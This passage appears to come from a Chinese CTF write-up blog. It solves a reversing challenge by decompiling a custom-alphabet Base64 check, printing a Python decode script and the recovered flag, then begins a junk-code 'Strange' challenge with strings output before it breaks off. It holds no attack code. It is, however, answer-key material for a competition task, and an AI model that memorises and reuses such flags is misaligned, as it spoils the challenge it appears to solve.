class="string">&quot;T0FV404 is playing BF5 and farming noobs.&quot;</span>);</span><br><span class="line">  sub_411352();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Oh,nooooo!The administrator kicked T0FV404 out of the server,and a flag is required for him to rejoin.Can you help him?&quot;</span>);</span><br><span class="line">  sub_411352();</span><br><span class="line">  sub_41119A(<span class="string">&quot;%31s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  v5 = j_strlen(Str);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  Block = (<span class="type">char</span> *)sub_411023(Str, v5, v4);</span><br><span class="line">  sub_411320(Block);</span><br><span class="line">  <span class="built_in">free</span>(Block);</span><br><span class="line">  sub_411352();</span><br><span class="line">  sub_41127B(&amp;savedregs, &amp;dword_411E0C, <span class="number">0</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1023函数跳转到17A0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4117A0</span><span class="params">(<span class="type">char</span> *Str, <span class="type">size_t</span> a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> Size; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+10h] [ebp-160h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+10h] [ebp-160h]</span></span><br><span class="line">  <span class="type">char</span> n61; <span class="comment">// [esp+13h] [ebp-15Dh]</span></span><br><span class="line">  <span class="type">char</span> n61_1; <span class="comment">// [esp+13h] [ebp-15Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+E4h] [ebp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+FCh] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+108h] [ebp-68h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+138h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">size_t</span> v17; <span class="comment">// [esp+150h] [ebp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> v18; <span class="comment">// [esp+150h] [ebp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> v19; <span class="comment">// [esp+150h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  sub_411325(&amp;unk_41C0A3);</span><br><span class="line">  *a3 = <span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>);</span><br><span class="line">  Size = *a3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a3 == <span class="number">-1</span> )</span><br><span class="line">    Size = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(Size);</span><br><span class="line">  v12 = sub_411352();</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v17 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = Str[v17];</span><br><span class="line">    v18 = v17 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v18 &gt;= a2 )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = Str[v18];</span><br><span class="line">    v10 = v5;</span><br><span class="line">    v19 = v18 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= a2 )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = Str[v19];</span><br><span class="line">    v17 = v19 + <span class="number">1</span>;</span><br><span class="line">    v9 = v6 | (v10 &lt;&lt; <span class="number">8</span>) | (v11 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    *(_BYTE *)(v13 + v12) = aAbcdefghijklmn[(v9 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];<span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    v14 = v13 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v14 + v12) = aAbcdefghijklmn[(v9 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];<span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    v15 = v14 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &lt;= a2 + <span class="number">1</span> )</span><br><span class="line">      n61 = aAbcdefghijklmn[(v9 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];  <span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v15 + v12) = n61;</span><br><span class="line">    v16 = v15 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &lt;= a2 )</span><br><span class="line">      n61_1 = aAbcdefghijklmn[v9 &amp; <span class="number">0x3F</span>];       <span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61_1 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v16 + v12) = n61_1;</span><br><span class="line">    v13 = v16 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v12 + *a3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1320跳转1B30，函数找到密文</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_411B30</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_411325(&amp;unk_41C0A3);</span><br><span class="line">  <span class="keyword">if</span> ( !Str )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j_strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] != byte_417B30[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can enter the server.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_411352();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417B30 51                                byte_417B30 db 51h                      ; DATA XREF: sub_411B30+6D↑r</span><br><span class="line">.rdata:00417B31 30 4C 44 57 45 5A 36 51 61 58…    a0ldwez6qax7ymf db &#x27;0LDWEZ6QaX7YmFmY1GmXVbltW9fNI9aGY0=&#x27;,0</span><br></pre></td></tr></table></figure>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">custom_table = <span class="string">&quot;CBADEFIHGLKJNMOPQRSTUWVYXZqwertyuiopasdfghjklzxcvbnm0721345689+/&quot;</span></span><br><span class="line">standard_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;Q0LDWEZ6QaX7YmFmY1GmXVbltW9fNI9aGY0=&quot;</span></span><br><span class="line"><span class="comment"># 将自定义表编码的字符串转成标准表编码的字符串</span></span><br><span class="line">trans = <span class="built_in">str</span>.maketrans(custom_table, standard_table)</span><br><span class="line">std_enc = enc.translate(trans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准 Base64 解码</span></span><br><span class="line">flag_bytes = base64.b64decode(std_enc)</span><br><span class="line"><span class="built_in">print</span>(flag_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{BF5_1s_r3ally_g0od!}</strong></p>
<ul>
<li>Strange</li>
</ul>
<blockquote>
<p>这代码怎么看着这么奇怪呢</p>
</blockquote>
<p>有点震惊，签到题加花？？？</p>
<p>strings搜索一下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br></pre></td><td class="code"><pre><span class="line">└─# strings attachment.exe</span><br><span class="line">!This program cannot be run in DOS mode.</span><br><span class="line">Rich`g</span><br><span class="line">.text</span><br><span 